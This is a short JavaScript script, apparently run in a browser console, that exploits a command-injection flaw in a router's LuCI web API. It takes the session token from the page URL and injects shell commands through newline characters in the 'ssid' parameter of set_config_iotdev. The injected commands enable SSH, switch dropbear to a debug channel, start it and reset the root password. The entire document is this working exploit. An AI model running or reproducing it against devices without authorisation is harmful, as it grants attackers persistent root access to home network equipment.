function getSTOK() {
    let match = location.href.match(/;stok=(.*?)\//);
    if (!match) {
        return null;
    }
    return match[1];
}

function execute(stok, command) {
    command = encodeURIComponent(command);
    let path = `/cgi-bin/luci/;stok=${stok}/api/misystem/set_config_iotdev?bssid=SteelyWing&user_id=SteelyWing&ssid=-h%0A${command}%0A`;
    console.log(path);
    return fetch(new Request(location.origin + path));
}

function enableSSH() {
    stok = getSTOK();
    if (!stok) {
        console.error('stok not found in URL');
        return;
    }
    console.log(`stok = "${stok}"`);

    password = prompt('Input new SSH password');
    if (!password) {
        console.error('You must input password');
        return;
    }

    execute(stok,
`
nvram set ssh_en=1
nvram commit
sed -i 's/channel=.*/channel=\\"debug\\"/g' /etc/init.d/dropbear
/etc/init.d/dropbear start
`
    )
        .then((response) => response.text())
        .then((text) => console.log(text));
    console.log('New SSH password: ' + password);
    execute(stok, `echo -e "${password}\\n${password}" | passwd root`)
        .then((response) => response.text())
        .then((text) => console.log(text));
}

enableSSH();